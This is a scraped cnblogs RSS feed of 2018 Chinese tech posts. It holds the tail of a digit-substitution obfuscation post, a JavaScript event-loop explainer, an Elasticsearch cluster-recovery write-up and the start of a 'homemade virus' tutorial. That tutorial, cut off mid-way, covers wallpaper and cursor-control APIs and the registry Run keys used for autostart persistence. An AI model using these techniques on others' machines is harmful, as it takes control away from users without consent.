        &lt;/span&gt;&lt;span&gt;$b&lt;/span&gt;=''&lt;span&gt;;
        &lt;/span&gt;&lt;span&gt;for&lt;/span&gt;(&lt;span&gt;$i&lt;/span&gt;=0; &lt;span&gt;$i&lt;/span&gt;&amp;lt;&lt;span&gt;strlen&lt;/span&gt;(&lt;span&gt;$str&lt;/span&gt;); &lt;span&gt;$i&lt;/span&gt;++&lt;span&gt;){
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(&lt;span&gt;isset&lt;/span&gt;(&lt;span&gt;$hashMap&lt;/span&gt;[&lt;span&gt;substr&lt;/span&gt;(&lt;span&gt;$str&lt;/span&gt;, &lt;span&gt;$i&lt;/span&gt;, 1&lt;span&gt;)])){
                &lt;/span&gt;&lt;span&gt;$b&lt;/span&gt; .= (&lt;span&gt;string&lt;/span&gt;)&lt;span&gt;$hashMap&lt;/span&gt;[&lt;span&gt;substr&lt;/span&gt;(&lt;span&gt;$str&lt;/span&gt;, &lt;span&gt;$i&lt;/span&gt;, 1&lt;span&gt;)];
            }&lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;{
                &lt;/span&gt;&lt;span&gt;$b&lt;/span&gt; .= (&lt;span&gt;string&lt;/span&gt;)&lt;span&gt;substr&lt;/span&gt;(&lt;span&gt;$str&lt;/span&gt;, &lt;span&gt;$i&lt;/span&gt;, 1&lt;span&gt;);
            }
        }
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;$b&lt;/span&gt;&lt;span&gt;;
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;对应前端可以进行反向解密：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;48&quot;&gt;
&lt;pre&gt;
&lt;span&gt;function&lt;/span&gt;&lt;span&gt; decodeHash(str){
        str &lt;/span&gt;+= ''&lt;span&gt;;
        &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; hashMap =&lt;span&gt; {
            &lt;/span&gt;'4': '0',
            '9': '1',
            '1': '2',
            '7': '3',
            '2': '4',
            '8': '5',
            '3': '6',
            '6': '7',
            '5': '8',
            '0': '9',&lt;span&gt;
        };
        &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; b = ''&lt;span&gt;;
        &lt;/span&gt;&lt;span&gt;for&lt;/span&gt;(&lt;span&gt;var&lt;/span&gt; i=0;i&amp;lt;str.length;i++&lt;span&gt;){
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(hashMap[str.&lt;span&gt;substr&lt;/span&gt;(i,1&lt;span&gt;)]){
                b &lt;/span&gt;+= hashMap[str.&lt;span&gt;substr&lt;/span&gt;(i,1&lt;span&gt;)]
            }&lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;{
                b &lt;/span&gt;+= str.&lt;span&gt;substr&lt;/span&gt;(i,1&lt;span&gt;)
            }
        }
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; b;
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;这样 123456 加密后就变成了：917283&lt;/p&gt;

&lt;p&gt;这种方法较笨，而且加密效果不是很好，只是简单的混淆。&lt;/p&gt;
&lt;p&gt;如果你有更好的方法，期待留言一起探讨~&lt;/p&gt;

</description>
<pubDate>Tue, 07 Aug 2018 06:26:00 +0000</pubDate>
<dc:creator>冒雨ing</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/saysmy/p/9430530.html</dc:identifier>
</item>
<item>
<title>JS运行机制（同步、异步、Event Loop） - 一叶落知天下秋grow</title>
<link>http://www.cnblogs.com/chao-insist/p/9433774.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/chao-insist/p/9433774.html</guid>
<description>&lt;p&gt;&lt;span&gt;一、&lt;span&gt;&lt;strong&gt;JS为什么是单线程的&lt;/strong&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;Javascript语言的一大特点就是单线程，同一时间只能做同一件事，那么为什么JS不能多线程呢？&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;作为浏览器脚本语言，Javascript的主要用途是与用户互动，以及操作DOM，这决定了它只能是单线程，否则会带来很复杂的同步问题。比如：假定Javascript同时有两个线程，一个线程在某个DOM节点上添加内容，另一个线程删除了找个节点，这时浏览器应该以哪一个为准？&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;所以，为了避免复杂性，从一诞生，Javascript就是单线程，这已经成为了这门语言的核心特征，将来也不会改变。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;为了利用多核CPU的计算能力，HTML5提出Web Woker标准，允许Javascript脚本创建多个线程，但是子线程完全受主线程控制，且不能操作DOM。所以，这个新标准并没有改变JavaScript单线程的本质。&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;二、&lt;strong&gt;&lt;span&gt;同步和异步&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;假设存在一个函数A：&lt;/p&gt;
&lt;p&gt;A（args...）{...}&lt;/p&gt;

&lt;p&gt;同步：如果在调用函数A的时候，调用者&lt;span&gt;立即能够得到&lt;/span&gt;预期的结果，那么这个函数就是同步的。&lt;/p&gt;
&lt;p&gt;异步：如果在调用函数A的时候，调用者&lt;span&gt;无法立即得到&lt;/span&gt;预期的结果，而是需要在将来通过一定的手段（耗时，延时，事件触发）得到，那么这个函数就是异步的。&lt;/p&gt;

&lt;p&gt;三、&lt;span&gt;&lt;strong&gt;JS是如何实现异步操作的&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;虽然JS是单线程的但是浏览器的内核是多线程的，浏览器为一些耗时任务开辟了另外的线程，不同的异步操作会由不同的浏览器内核模块调度执行，例如onlcik,setTimeout,ajax处理的方式都不同，分别是由浏览器内核中的DOM Bingding、network、timer模块执行，当执行的任务得到运行结果时，会将对应的回调函数放到任务队列中。所以说，&lt;span&gt;JS是一直都是单线程的，实现异步操作的其实是浏览器&lt;/span&gt;。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1067552/201808/1067552-20180806214341585-2000322650.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;在上图中，&lt;span&gt;调用栈中遇到DOM请求、ajax请求以及setTimeout等WebAPIs的时候就会交给浏览器内核的其他模块进行处理&lt;/span&gt;，webkit内核在Javascript执行引擎之外，有一个重要的模块是webcoew模块。对于图中WebAPIs提到的三种API，webcore分别提供了DOM Binding、network、timer模块来处理底层实现。&lt;span&gt;等到这些模块处理完这些操作的时候将回调函数放入任务队列中，之后等栈中的task执行完之后再去执行任务队列中的回调函数。&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;&lt;strong&gt;小结：&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　1.所有的代码都要通过函数调用栈中调用执行&lt;/p&gt;
&lt;p&gt;　　2.当遇到前文中提到的APIs的时候，会交给浏览器内核的其他模块进行处理&lt;/p&gt;
&lt;p&gt;　　3.任务队列中存放的是回调函数&lt;/p&gt;
&lt;p&gt;　　4.等到调用栈中的task执行完之后再回去执行任务队列中的task&lt;/p&gt;

&lt;p&gt;JS的运行机制如下：&lt;/p&gt;
&lt;p&gt;（1）所有的同步任务都在主线程上执行，形成一个执行栈。&lt;/p&gt;
&lt;p&gt;（2）主线程之外，还存在一个“任务队列”。只要异步任务有了运算结果，就在“任务队列“之中放置一个事件（回调函数）。&lt;/p&gt;
&lt;p&gt;（3）一旦“执行栈”中的所有同步任务执行完毕，系统就会读取“任务队列”，看看里面有哪些事件。那些对应的异步任务，于是结束等待状态。进入执行栈，开始执行。&lt;/p&gt;
&lt;p&gt;（4）主线程不断重复上面的第三步&lt;/p&gt;

&lt;p&gt;&lt;span&gt;&lt;strong&gt;任务队列&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;上文中一直都有提到任务队列，那么任务队列到底是个什么东东呢？举个🌰&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;在ES6的标准中，任务队列分为宏任务（&lt;span&gt;macro-task&lt;/span&gt;）和微任务（&lt;span&gt;micro-task&lt;/span&gt;）&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;1.macro-task包括：script(整体代码), setTimeout, setInterval, setImmediate, I/O, UI rendering&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;2.micro-task包括：process.nextTick, Promises, Object.observe, MutationObserver&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;事件循环的顺序是从script开始第一次循环，随后全局上下文进入函数调用栈，碰到macro-task就将其交给处理它的模块处理完之后将回调函数放进macro-task的队列之中，碰到micro-task也是将其回调函数放进micro-task的队列之中。直到函数调用栈清空只剩全局执行上下文，然后开始执行所有的micro-task。当所有可执行的micro-task执行完毕之后。循环再次执行macro-task中的一个任务队列，执行完之后再执行所有的micro-task，就这样一直循环。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;接下来我们分析一下执行过程：&lt;/span&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;span&gt;&lt;code&gt;(function test() {
    setTimeout(function() {console.log(4)}, 0);
    new Promise(function executor(resolve) {
        console.log(1);
        for( var i=0 ; i&amp;lt;10000 ; i++ ) {
            i == 9999 &amp;amp;&amp;amp; resolve();
        }
        console.log(2);
    }).then(function() {
        console.log(5);
    });
    console.log(3);
})()&lt;/code&gt;&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;1.全局上下文入栈，开始执行其中的代码。&lt;/p&gt;
&lt;p&gt;2.执行到setTimeout，作为一个macro-task交给timer模块处理完成后将其回调函数放入自己的队列中。&lt;/p&gt;
&lt;p&gt;3.执行到Promise实例，将Promise入栈，第一个参数是在当前任务直接执行输出1。&lt;/p&gt;
&lt;p&gt;4.执行循环体，遇到resolve函数，入栈执行后出栈，改变promise状态为Fulfilled，随后输出2&lt;/p&gt;
&lt;p&gt;5.遇到then方法，作为micro-task，进入Promise的任务队列。&lt;/p&gt;
&lt;p&gt;6.继续执行代码，输出3。&lt;/p&gt;
&lt;p&gt;7.输出3之后第一个宏任务代码执行完毕，开始执行所有在队列之中的微任务。then的回调函数入栈执行后出栈，输出5。&lt;/p&gt;
&lt;p&gt;8.这时候所有的micao-task执行完毕，第一轮循环结束。第二轮循环从setTimeout的任务队列开始，setTimeout的回调函数入栈执行完毕之后出栈，此时输出4。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;span&gt;小结：&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;ol readability=&quot;2.5&quot;&gt;&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;不同的任务会放进不同的任务队列之中。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;先执行macro-task，等到函数调用栈清空之后再执行所有在队列之中的micro-task。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;等到所有micro-task执行完之后再从macro-task中的一个任务队列开始执行，就这样一直循环。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;当有多个macro-task(micro-task)队列时，事件循环的顺序是按上文macro-task(micro-task)的分类中书写的顺序执行的。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;总结：&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　JS引擎在解析JS代码的时候，会创建一个主线程（main thread）和一个调用堆栈（call-stack），在对一个调用堆栈中的task处理的时候，其他的都要等着。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　当执行到一些异步操作的时候，会交给浏览器内核的其他模块处理（以webkit为例，是webcore模块），处理完成将task（回调函数）放入任务队列中。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　一般不同的异步任务的回调函数都会放入不同的任务队列中，等到调用栈中所有的task执行完毕，接着去执行任务队列中的task（回调函数）&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;　&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;

</description>
<pubDate>Tue, 07 Aug 2018 06:25:00 +0000</pubDate>
<dc:creator>一叶落知天下秋grow</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/chao-insist/p/9433774.html</dc:identifier>
</item>
<item>
<title>线上 ELK 集群健康值 red 状态问题排查与解决 - haifeiWu</title>
<link>http://www.cnblogs.com/haifeiWu/p/9436775.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/haifeiWu/p/9436775.html</guid>
<description>&lt;p&gt;之前一直运行正常的数据分析平台，最近一段时间没有注意发现日志索引数据一直未生成，大概持续了n多天，当前状态: 单台机器, Elasticsearch（下面称ES）单节点(空集群),1000+shrads, 约200G大小。&lt;/p&gt;
&lt;h2 id=&quot;问题排查&quot;&gt;问题排查&lt;/h2&gt;
&lt;h3 id=&quot;服务器内存cpu状态检查&quot;&gt;服务器内存，CPU状态检查&lt;/h3&gt;
&lt;p&gt;使用 &lt;code&gt;top&lt;/code&gt; 查看服务器 &lt;code&gt;cpu&lt;/code&gt;，内存等占用情况，如下图示（当时楼主的服务器ES应用的CPU占用在90%以上，肯定有问题）&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://user-gold-cdn.xitu.io/2018/8/7/16512a56d09216c9?w=555&amp;amp;h=157&amp;amp;f=png&amp;amp;s=13744&quot; title=&quot;top&quot; alt=&quot;top&quot;/&gt;&lt;/p&gt;
&lt;p&gt;内存占用也极高（当时楼主的8G内存的服务器仅剩下150M左右的空闲，肯定是ES的问题）&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://user-gold-cdn.xitu.io/2018/8/7/16512a56d0810172?w=530&amp;amp;h=67&amp;amp;f=png&amp;amp;s=3812&quot; title=&quot;free&quot; alt=&quot;free&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;es集群状态&quot;&gt;ES集群状态&lt;/h3&gt;
&lt;p&gt;查看ES集群健康值，发现 &lt;code&gt;status&lt;/code&gt; 为 &lt;code&gt;red&lt;/code&gt;，这种状态表示部分主分片不可用，楼主当前的状态是历史数据可查，但是无法生成新的 &lt;code&gt;index&lt;/code&gt; 数据。&lt;/p&gt;
&lt;pre class=&quot;bash&quot;&gt;
&lt;code&gt;curl http://localhost:9200/_cluster/health?pretty

{
  &quot;cluster_name&quot; : &quot;elasticsearch&quot;,
  &quot;status&quot; : &quot;red&quot;,
  &quot;timed_out&quot; : false,
  &quot;number_of_nodes&quot; : 1,
  &quot;number_of_data_nodes&quot; : 1,
  &quot;active_primary_shards&quot; : 663,
  &quot;active_shards&quot; : 663,
  &quot;relocating_shards&quot; : 0,
  &quot;initializing_shards&quot; : 0,
  &quot;unassigned_shards&quot; : 6,
  &quot;delayed_unassigned_shards&quot; : 0,
  &quot;number_of_pending_tasks&quot; : 0,
  &quot;number_of_in_flight_fetch&quot; : 0,
  &quot;task_max_waiting_in_queue_millis&quot; : 0,
  &quot;active_shards_percent_as_number&quot; : 99.10313901345292
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;查看每个索引的状态，发现大部分索引状态是 &lt;code&gt;red&lt;/code&gt; ，处于不可用状态，因为打开的索引数据过多，导致ES占用大量的CPU，内存，使得 &lt;code&gt;logstash&lt;/code&gt; 不可用，也就无法创建新的索引数据，从而导致数据丢失。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;curl -XGET   &quot;http://localhost:9200/_cat/indices?v&quot;

health status index          pri rep docs.count docs.deleted store.size pri.store.size
red    open   jr-2016.12.20    3   0
red    open   jr-2016.12.21    3   0
red    open   jr-2016.12.22    3   0
red    open   jr-2016.12.23    3   0
red    open   jr-2016.12.24    3   0
red    open   jr-2016.12.25    3   0
red    open   jr-2016.12.26    3   0
red    open   jr-2016.12.27    3   0&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;es集群分片不可用导致的查询失败&quot;&gt;ES集群分片不可用，导致的查询失败&lt;/h3&gt;
&lt;p&gt;查询ES时抛出的异常：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;[2018-08-06 18:27:24,553][DEBUG][action.search            ] [Godfrey Calthrop] All shards failed for phase: [query]
[jr-2018.08.06][[jr-2018.08.06][2]] NoShardAvailableActionException[null]
    at org.elasticsearch.action.search.AbstractSearchAsyncAction.start(AbstractSearchAsyncAction.java:129)
    at org.elasticsearch.action.search.TransportSearchAction.doExecute(TransportSearchAction.java:115)
    at org.elasticsearch.action.search.TransportSearchAction.doExecute(TransportSearchAction.java:47)
    at org.elasticsearch.action.support.TransportAction.doExecute(TransportAction.java:149)
    at org.elasticsearch.action.support.TransportAction.execute(TransportAction.java:137)
    at org.elasticsearch.action.support.TransportAction.execute(TransportAction.java:85)
    at org.elasticsearch.client.node.NodeClient.doExecute(NodeClient.java:58)
    at org.elasticsearch.client.support.AbstractClient.execute(AbstractClient.java:359)
    at org.elasticsearch.client.FilterClient.doExecute(FilterClient.java:52)
    at org.elasticsearch.rest.BaseRestHandler$HeadersAndContextCopyClient.doExecute(BaseRestHandler.java:83)
    at org.elasticsearch.client.support.AbstractClient.execute(AbstractClient.java:359)
    at org.elasticsearch.client.support.AbstractClient.search(AbstractClient.java:582)
    at org.elasticsearch.rest.action.search.RestSearchAction.handleRequest(RestSearchAction.java:85)
    at org.elasticsearch.rest.BaseRestHandler.handleRequest(BaseRestHandler.java:54)
    at org.elasticsearch.rest.RestController.executeHandler(RestController.java:205)
    at org.elasticsearch.rest.RestController.dispatchRequest(RestController.java:166)
    at org.elasticsearch.http.HttpServer.internalDispatchRequest(HttpServer.java:128)
    at org.elasticsearch.http.HttpServer$Dispatcher.dispatchRequest(HttpServer.java:86)
    at org.elasticsearch.http.netty.NettyHttpServerTransport.dispatchRequest(NettyHttpServerTransport.java:449)
    at org.elasticsearch.http.netty.HttpRequestHandler.messageReceived(HttpRequestHandler.java:61)&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;问题解决&quot;&gt;问题解决&lt;/h2&gt;
&lt;p&gt;通过以上排查大概知道是历史索引数据处于 open 状态过多，从而导致ES的CPU，内存占用过高导致的不可用。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;#关闭不需要的索引，减少内存占用
curl -XPOST &quot;http://localhost:9200/index_name/_close&quot;&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;小插曲&quot;&gt;小插曲&lt;/h3&gt;
&lt;p&gt;关闭非热点索引数据后，楼主的ES集群的健康值依然是 red 状态，楼主最后联想到索引的 red 状态可能会影响ES的状态，果不其然如下所示&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;curl GET http://10.252.148.85:9200/_cluster/health?level=indices

{
    &quot;cluster_name&quot;: &quot;elasticsearch&quot;,
    &quot;status&quot;: &quot;red&quot;,
    &quot;timed_out&quot;: false,
    &quot;number_of_nodes&quot;: 1,
    &quot;number_of_data_nodes&quot;: 1,
    &quot;active_primary_shards&quot;: 660,
    &quot;active_shards&quot;: 660,
    &quot;relocating_shards&quot;: 0,
    &quot;initializing_shards&quot;: 0,
    &quot;unassigned_shards&quot;: 9,
    &quot;delayed_unassigned_shards&quot;: 0,
    &quot;number_of_pending_tasks&quot;: 0,
    &quot;number_of_in_flight_fetch&quot;: 0,
    &quot;task_max_waiting_in_queue_millis&quot;: 0,
    &quot;active_shards_percent_as_number&quot;: 98.65470852017937,
    &quot;indices&quot;: {
        &quot;jr-2018.08.06&quot;: {
            &quot;status&quot;: &quot;red&quot;,
            &quot;number_of_shards&quot;: 3,
            &quot;number_of_replicas&quot;: 0,
            &quot;active_primary_shards&quot;: 0,
            &quot;active_shards&quot;: 0,
            &quot;relocating_shards&quot;: 0,
            &quot;initializing_shards&quot;: 0,
            &quot;unassigned_shards&quot;: 3
        }
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;解决方法，删除这条索引数据（这条数据是楼主排查问题期间产生的脏数据，索引直接删除）&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;curl -XDELETE 'http://10.252.148.85:9200/jr-2018.08.06'&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;小结&quot;&gt;小结&lt;/h2&gt;
&lt;p&gt;当ES处于单点时，应注意ES的索引状态以及服务器的监控，及时清理或者关闭不必要的索引数据，避免这种情况发生。技术成长的道路上，与你同行。&lt;/p&gt;
</description>
<pubDate>Tue, 07 Aug 2018 06:24:00 +0000</pubDate>
<dc:creator>haifeiWu</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/haifeiWu/p/9436775.html</dc:identifier>
</item>
<item>
<title>自制病毒——控制桌面鼠标以及开关机 - AntzUhl</title>
<link>http://www.cnblogs.com/LexMoon/p/Virus.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/LexMoon/p/Virus.html</guid>
<description>&lt;h2 id=&quot;修改桌面背景方法&quot;&gt;1.1 修改桌面背景方法&lt;/h2&gt;
&lt;p&gt;在Windows下，修改桌面背景可以使用特定的API : SystemParametersInfo&lt;/p&gt;
&lt;p&gt;该函数也可以在设置参数中更新用户配置文件，这个函数还有很多其它功能，比如获取桌面工作区的大小。&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;BOOL SystemParametersInfo（UINT uiAction，UINT uiParam，PVOID pvParam，UINT fWinlni）;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;uiaction该参数指定要查询或设置的系统级参数其取值如下&quot;&gt;uiAction：该参数指定要查询或设置的系统级参数。其取值如下；&lt;/h3&gt;
&lt;pre&gt;
&lt;code&gt;SPI_GETACCESSTIMEOUT：检索与可访问特性相关联的超时段的信息，PvParam参数必须指向某个ACCESSTIMEOUT结构以获得信息，并将该结构中的cbSjze成员和ulParam参数的值设为sizeof（ACCESSTIMEOUT）。

SPI_GETACTIVEWINDOWTRACKING：用于Windows 98和Windows NT 5.0及以后的版本。它表示是否打开活动窗口跟踪（激活该窗口时鼠标置为开状态），pvParam参数必须指向一个BOOL型变量（打开时接收值为TRUE，关闭时为FALSE）。

SPI_GETACTIVEWNDTRKZORDER；用于Windows 98和Windows NT 5.0及以后版本。它表示通过活动窗口跟踪开关激活的窗口是否要置于最顶层。pvParam参数必须指向一个BOOL型变量，如果要置于顶层，那么该变量的值为TRUE，否则为FALSE。

SPI_GETACTIVEWNDTRKTIMEOUT：用于Windows 98和 Windows NT 5.0及以后版本。它指示活动窗口跟踪延迟量，单位为毫秒。pvParam参数必须指向DWORD类型变量，以接收时间量。

SPI_GETANIMATION：检索与用户活动有关的动画效果。pvParam参数必须指向ANIMATIOINFO结构以接收信息。并将该结构的cbSize成员和ulParam参数置为sizeof（ANIMATIONINFO）。

SPI_GETBEEP：表示警告蜂鸣器是否是打开的。pvParam参数必须指向一个BOOL类型变量，如果蜂鸣器处于打开状态，那么该变量的值为TRUE，否则为FALSE。

SpI_GETBORDER：检索决定窗口边界放大宽度的边界放大因子。pvParam参数必须指向一个整型变量以接收该值。

SPI_GETDEFAULTINPUTLANG：返回用于系统缺省输入语言的键盘布局句柄。pvParam参数必须指向一个32位变量，以接收该值。

SPI_GETCOMBOBOXANIMATION：用于Windows 98和Windows NT 5.0及以后版本。它表示用于组合柜的动打开效果是否允许。pvParam参数必须指向一个BOOL变量，如果允许，那么变量返回值为TRUE，否则为FALSE。

SPI_GETDRAGFULLWINDOWS：确定是否允许拖拉到最大窗口。pvParam参数必须指向BOOL变量，如果允许，返回值为TRUE，否则为FALSE。对于Windows 95系统，该标志只有在安装了Windows plus!才支持。

SPI_GETFASTTASKSWITCH：该标志已不用！以前版本的系统使用该标志来确定是否允许Alt+Tab快速任务切换。对于Windows 95、Windows 98和Windows NT 4.0版而言，快速任务切换通常是允许的。&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;更多&quot;&gt;&lt;a href=&quot;https://github.com/CasterWx/c-cPlusPlus-Virus&quot;&gt;更多&lt;/a&gt;&lt;/h3&gt;
&lt;h3 id=&quot;uiparamuiparam-在参数说明中所有为ulparam均为错误&quot;&gt;uiParam：uiParam 在参数说明中所有为ulParam均为错误。&lt;/h3&gt;
&lt;pre&gt;
&lt;code&gt;这个参数值设为true即可。&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;pvparam与查询或设置的系统参数有关关于系统级参数的详情请参考uiaction参数否则在没有指明情况下必须将该参数指定为null&quot;&gt;pvParam：与查询或设置的系统参数有关。关于系统级参数的详情，请参考uiAction参数。否则在没有指明情况下，必须将该参数指定为NULL。&lt;/h3&gt;
&lt;pre&gt;
&lt;code&gt;在修改背景图片时为图片信息，PVOID类型。&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;fwinlni如果设置系统参数则它用来指定是否更新用户配置文件profile亦或是否要将wm_settingchange消息广播给所有顶层窗口以通知它们新的变化内容该参数可以是0或下列取值之一&quot;&gt;fWinlni：如果设置系统参数，则它用来指定是否更新用户配置文件（Profile）。亦或是否要将WM_SETTINGCHANGE消息广播给所有顶层窗口，以通知它们新的变化内容。该参数可以是0或下列取值之一：&lt;/h3&gt;
&lt;pre&gt;
&lt;code&gt;SPIF_UPDATEINIFILE：把新的系统参数的设置内容写入用户配置文件。

SPIF_SENDCHANGE：在更新用户配置文件之后广播WM_SETTINGCHANGE消息。

SPI_SENDWININICHANGE与 SPIF_SENDCHANGE一样。&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;返回值&quot;&gt;返回值&lt;/h3&gt;
&lt;pre&gt;
&lt;code&gt;如果函数调用成功，返回值非零：如果函数调用失败，那么返回值为零。&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;控制鼠标方法&quot;&gt;1.2 控制鼠标方法&lt;/h2&gt;
&lt;p&gt;控制鼠标坐标的方法同样也时调用一个API，GetCursorPos和SetCursorPos&lt;/p&gt;
&lt;h3 id=&quot;getcursorpos用于获取鼠标句柄&quot;&gt;GetCursorPos用于获取鼠标句柄&lt;/h3&gt;
&lt;pre&gt;
&lt;code&gt;#include&amp;lt;stdio.h&amp;gt;
#include&amp;lt;windows.h&amp;gt;
int main()
{
    POINT p;
    GetCursorPos(&amp;amp;p);
    
    return0;
}&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;setcursorpos用于移动鼠标&quot;&gt;SetCursorPos用于移动鼠标&lt;/h3&gt;
&lt;p&gt;在使用GetCursorPos获取鼠标句柄之后，可以调用SetCursorPos移动鼠标，它的两个参数分别是x轴和y轴。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;函数原型：BOOL SetCursorPos（int X，int Y）；
参数：
X：指定光标的新的X坐标，以屏幕坐标表示。
Y：指定光标的新的Y坐标，以屏幕坐标表示。
返回值：如果成功，返回非零值；如果失败，返回值是零，若想获得更多错误信息，请调用GetLastError函数。
备注：该光标是共享资源，仅当该光标在一个窗口的客户区域内时它才能移动该光标。&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;开机自启动方法&quot;&gt;1.3 开机自启动方法&lt;/h2&gt;
&lt;h3 id=&quot;注册表&quot;&gt;注册表&lt;/h3&gt;
&lt;p&gt;开机自启动的实现方法就是通过注册表实现，在注册表中有固定的开机自启程序设置位置&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run;

HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Runonce;

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run;

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce;

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;在这几项中有我们电脑中的开机自启动程序信息，&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images.cnblogs.com/cnblogs_com/LexMoon/1246510/o_regedit.jpg&quot; alt=&quot;s&quot;/&gt;&lt;/p&gt;
&lt;p&gt;例如这个WeChat就是开机时的微信登录程序。&lt;/p&gt;
&lt;h3 id=&quot;注册表读写方法&quot;&gt;注册表读写方法&lt;/h3&gt;
&lt;h3 id=&quot;regcreatekey&quot;&gt;RegCreateKey&lt;/h3&gt;
&lt;pre&gt;
&lt;code&gt;// 打开注册表
LONG WINAPI RegCreateKey(
_In_ HKEY hKey,
_In_opt_ LPCTSTR lpSubKey,
_Out_ PHKEY phkResult
);&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;hKey&lt;/strong&gt;&lt;br/&gt;指向当前打开表项的句柄，或者是下列预定义保留句柄值之一，实际上就是注册表中的几个分支。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;lpSubKey&lt;/strong&gt;&lt;br/&gt;指向一个空终止的字符串指针，指示这个函数将打开或创建的表项的名称。这个表项必须是由hKey参数所标识的项的子项&lt;/p&gt;
